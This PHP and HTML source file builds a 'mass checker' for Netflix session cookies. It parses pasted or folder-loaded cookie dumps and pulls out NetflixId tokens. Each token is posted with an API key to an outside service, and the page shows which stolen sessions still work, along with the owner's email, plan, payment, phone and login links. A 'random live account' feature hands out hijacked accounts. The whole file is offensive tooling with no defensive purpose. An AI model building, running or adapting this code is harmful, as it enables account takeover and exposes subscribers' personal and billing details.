<?php
// ================= SERVER COOKIES FOLDER =================
$cookies_folder = '/tmp/cookies';   // ← Baguhin dito

if (!is_dir($cookies_folder)) {
    mkdir($cookies_folder, 0777, true);
}

$cookie_files = glob($cookies_folder . '/*.txt');
$server_cookies = [];
foreach ($cookie_files as $file) {
    $content = trim(file_get_contents($file));
    if (!empty($content)) {
        $server_cookies[] = $content;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);
    if (isset($json_data['cookie'])) {
        $my_api_key = "NFK_cde619bfa57bd794d0e574da";
        $api_url = "https://nftoken.site/v1/api.php";
        $payload = json_encode([
            'key' => $my_api_key,
            'cookie' => $json_data['cookie']
        ]);
        $ch = curl_init($api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response === false) {
            http_response_code(500);
            header('Content-Type: application/json');
            echo json_encode(['status' => 'ERROR', 'message' => 'Connection failed']);
            exit;
        }
        header('Content-Type: application/json');
        echo $response;
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFToken Mass Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { background: linear-gradient(135deg, #0a0a0a, #1f2937); color: #e5e7eb; }
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(16px); border: 1px solid rgba(148, 163, 184, 0.2); }
        .result-card { transition: all 0.3s ease; }
        .result-card:hover { transform: translateY(-4px); }
        .modal { animation: modalPop 0.3s ease; }
        @keyframes modalPop {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body class="py-8">
<div class="max-w-4xl mx-auto px-4">
    <div class="text-center mb-10">
        <h1 class="text-4xl font-bold text-white flex items-center justify-center gap-3">
            <i class="fas fa-satellite-dish text-blue-500"></i> NFToken Mass Checker
        </h1>
    </div>

    <div class="glass rounded-3xl p-8 mb-8">
        <h2 class="text-xl font-semibold mb-4">✍️ Or Paste Manually</h2>
        <textarea id="bulkInput" rows="8" class="w-full rounded-2xl p-6 bg-[#0f172a] border border-slate-600 focus:border-blue-500 text-gray-200" placeholder="Paste cookies here..."></textarea>
        <div class="flex gap-3 mt-8">
            <button onclick="startApiTest()" id="startBtn" class="flex-1 bg-gradient-to-r from-emerald-500 to-teal-600 py-5 rounded-2xl font-bold text-xl">
                🚀 START MASS CHECK
            </button>
            <button onclick="generateRandomLiveAccount()" class="flex-1 bg-gradient-to-r from-purple-500 to-violet-600 py-5 rounded-2xl font-bold text-xl">
                🎲 Generate 1 Random Live Account
            </button>
        </div>
    </div>

    <div class="glass rounded-3xl p-8">
        <h2 class="text-xl font-semibold mb-4">📁 Select Cookies Folder</h2>
        <input type="file" id="folderInput" webkitdirectory directory multiple class="hidden">
        <button onclick="document.getElementById('folderInput').click()" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-2xl font-semibold text-lg">
            📂 SELECT FOLDER (.txt files)
        </button>
    </div>

    <div id="resultsCard" class="glass rounded-3xl p-8 hidden">
        <div class="flex justify-between items-center mb-6 bg-black/40 rounded-2xl p-5">
            <div class="flex gap-8">
                <div>
                    <span class="text-xs text-gray-400">TOTAL</span>
                    <span id="totalCount" class="block text-3xl font-bold">0</span>
                </div>
                <div>
                    <span class="text-xs text-emerald-400">ALIVE</span>
                    <span id="aliveCount" class="block text-3xl font-bold text-emerald-400">0</span>
                </div>
                <div>
                    <span class="text-xs text-red-400">DEAD</span>
                    <span id="deadCount" class="block text-3xl font-bold text-red-400">0</span>
                </div>
            </div>
            <span id="progressText" class="text-gray-400 font-medium">0%</span>
        </div>

        <!-- Improved Progress Bar -->
        <div class="h-3 bg-gray-700 rounded-full mb-6 overflow-hidden">
            <div id="progressBar" class="h-full bg-gradient-to-r from-blue-400 to-cyan-400 w-0 transition-all duration-300"></div>
        </div>

        <div class="flex gap-2 mb-6">
            <button onclick="filterResults('all')" class="px-6 py-2 bg-blue-600 rounded-xl font-medium">All</button>
            <button onclick="filterResults('alive')" class="px-6 py-2 bg-emerald-600 rounded-xl font-medium">Alive Only</button>
            <button onclick="filterResults('dead')" class="px-6 py-2 bg-red-600 rounded-xl font-medium">Dead Only</button>
        </div>

        <div id="resultsList" class="space-y-4 max-h-[620px] overflow-y-auto pr-2"></div>
    </div>
</div>

<!-- Custom Modal -->
<div id="customModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
    <div class="glass rounded-3xl p-8 max-w-md w-full mx-4 modal">
        <div class="text-center">
            <i id="modalIcon" class="fas fa-exclamation-triangle text-5xl mb-4"></i>
            <h3 id="modalTitle" class="text-2xl font-bold mb-3"></h3>
            <p id="modalMessage" class="text-gray-300 mb-8"></p>
            <button onclick="closeModal()" class="bg-blue-600 hover:bg-blue-700 px-10 py-3 rounded-2xl font-semibold">
                OK
            </button>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    let allCookiesFromFolder = [];
    let isPaused = false;
    let startTime = 0;

    document.getElementById('folderInput').addEventListener('change', async function(e) {
        const files = Array.from(e.target.files).filter(f => f.name.endsWith('.txt'));
        allCookiesFromFolder = [];
        for (let file of files) {
            const text = await file.text();
            allCookiesFromFolder = allCookiesFromFolder.concat(parseMixedInput(text));
        }
        showModal("✅ Success", `Loaded ${allCookiesFromFolder.length} cookies from folder!`);
    });

    function parseMixedInput(text) {
        let extracted = [];
        let startIndex = 0;
        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
            let endIndex = startIndex;
            let foundValid = false;
            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
                let potentialJson = text.substring(startIndex, endIndex + 1);
                try {
                    let parsed = JSON.parse(potentialJson);
                    if (Array.isArray(parsed)) {
                        extracted.push(potentialJson.trim());
                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
                        foundValid = true;
                        break;
                    }
                } catch (e) {}
            }
            if (!foundValid) startIndex++;
        }
        text = text.replace(/\|/g, '\n');
        let lines = text.split(/\r?\n/);
        let currentNetscape = [];
        let seenKeys = new Set();
        lines.forEach(line => {
            let trimmed = line.trim();
            if (!trimmed || trimmed === ';') {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                return;
            }
            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
                let parts = trimmed.split(/\s+/);
                if (parts.length >= 6) {
                    let keyName = parts[5];
                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                    seenKeys.add(keyName);
                }
                currentNetscape.push(trimmed);
            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                extracted.push(trimmed);
            }
        });
        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
        return extracted;
    }

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    function togglePause() {
        isPaused = !isPaused;
        document.getElementById('pauseBtn').textContent = isPaused ? '▶️ RESUME' : '⏸️ PAUSE';
    }

    function showModal(title, message) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalMessage').innerHTML = message.replace(/\n/g, '<br>');
        document.getElementById('customModal').classList.remove('hidden');
    }

    function closeModal() {
        document.getElementById('customModal').classList.add('hidden');
    }

    async function startApiTest() {
        let cookies = allCookiesFromFolder.length > 0 ? allCookiesFromFolder : parseMixedInput($('#bulkInput').val().trim());
        if (cookies.length === 0) {
            showModal("No Cookies Found", "Please do one of the following:\n\n• Paste cookies in the box above\n• Click SELECT FOLDER and choose your .txt files");
            return;
        }

        startTime = Date.now();
        $('#startBtn').hide();
        $('#pauseBtn').show();
        $('#resultsCard').show();
        $('#resultsList').empty();

        let total = cookies.length;
        let alive = 0;
        let dead = 0;

        $('#totalCount').text(total);
        $('#aliveCount').text(0);
        $('#deadCount').text(0);

        const apiUrl = window.location.href;

        for (let i = 0; i < cookies.length; i++) {
            if (isPaused) while (isPaused) await sleep(500);

            const elapsed = (Date.now() - startTime) / 1000;
            const progress = Math.round(((i + 1) / total) * 100);
            const speed = i / elapsed;
            const remaining = speed > 0 ? Math.round((total - i - 1) / speed) : 0;

            $('#progressText').text(`${progress}% • ETA: ${remaining}s`);
            document.getElementById('progressBar').style.width = progress + '%';

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: cookies[i] })
                });
                const data = JSON.parse(await response.text());

                if (data.status === 'SUCCESS') {
                    alive++;
                    $('#aliveCount').text(alive);
                    let resultHtml = `
                    <div class="result-card glass rounded-2xl p-6" data-type="alive">
                        <div class="flex items-center gap-3 mb-4">
                            <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">SUCCESS</span>
                            <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-4 text-sm">
                            <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
                            <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
                            <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
                            <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
                            <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
                            <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
                            <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
                        </div>
                        <div class="flex gap-3 mt-6">
                            <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
                            <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
                            <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
                        </div>
                    </div>`;
                    $('#resultsList').append(resultHtml);
                } else {
                    dead++;
                    $('#deadCount').text(dead);
                }
            } catch (e) {
                dead++;
                $('#deadCount').text(dead);
            }

            if (i < cookies.length - 1) await sleep(700);
        }

        $('#progressText').text(`Finished! Processed ${total} cookies.`);
        $('#startBtn').show();
        $('#pauseBtn').hide();
    }

    async function generateRandomLiveAccount() {
        const cookies = <?php echo json_encode($server_cookies); ?>;
        if (cookies.length === 0) {
            showModal("No Server Cookies", "Walang cookies sa server folder. Maglagay ka muna ng .txt files sa /cookies folder.");
            return;
        }

        $('#resultsCard').show();
        $('#resultsList').empty();
        $('#progressText').text(`Finding 1 live random account...`);

        for (let attempt = 0; attempt < 20; attempt++) {
            const randomIndex = Math.floor(Math.random() * cookies.length);
            const selectedCookie = cookies[randomIndex];

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: selectedCookie })
                });
                const data = JSON.parse(await response.text());

                if (data.status === 'SUCCESS' && data.x_tier && data.x_tier.toLowerCase() !== 'expired') {
                    let resultHtml = `
                    <div class="result-card glass rounded-2xl p-6" data-type="alive">
                        <div class="flex items-center gap-3 mb-4">
                            <span class="bg-emerald-500/20 text-emerald-400 px-4 py-1 rounded-full text-sm font-medium">RANDOM LIVE</span>
                            <span class="text-xl font-semibold">${data.x_mail || 'N/A'}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-4 text-sm">
                            <div><strong>Plan:</strong> ${data.x_tier || 'Unknown'}</div>
                            <div><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
                            <div><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
                            <div><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
                            <div><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
                            <div><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
                            <div class="col-span-2"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
                        </div>
                        <div class="flex gap-3 mt-6">
                            <a href="${data.x_l1 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">🖥️ PC</a>
                            <a href="${data.x_l2 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📱 Mobile</a>
                            <a href="${data.x_l3 || '#'}" target="_blank" class="flex-1 bg-zinc-800 hover:bg-zinc-700 py-3 rounded-xl text-center">📺 TV</a>
                        </div>
                    </div>`;
                    $('#resultsList').append(resultHtml);
                    $('#progressText').text(`Found 1 live random account!`);
                    return;
                }
            } catch (e) {}
        }

        showModal("No Live Found", "Walang live account na nahanap sa random tries. Subukan ulit.");
        $('#progressText').text(`No live account found.`);
    }

    function filterResults(type) {
        const items = document.querySelectorAll('#resultsList > div');
        items.forEach(item => {
            if (type === 'all') {
                item.style.display = 'block';
            } else if (type === 'alive') {
                item.style.display = item.getAttribute('data-type') === 'alive' ? 'block' : 'none';
            } else if (type === 'dead') {
                item.style.display = item.getAttribute('data-type') === 'dead' ? 'block' : 'none';
            }
        });
    }
</script>
</body>
</html>
